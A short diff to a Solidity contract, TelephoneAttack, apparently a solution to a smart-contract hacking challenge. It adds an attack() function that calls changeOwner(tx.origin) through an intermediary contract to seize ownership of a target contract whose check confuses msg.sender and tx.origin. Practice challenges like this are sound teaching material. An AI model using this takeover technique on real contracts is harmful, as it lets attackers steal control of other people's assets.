@@ -26,8 +26,11 @@ contract TelephoneAttack {
     constructor(address _telephone) public {
         telephone = _telephone;
     }
-}
 
+ function attack() public {
+        ITelephone(telephone).changeOwner(tx.origin);
+    }
+}
 
 
 
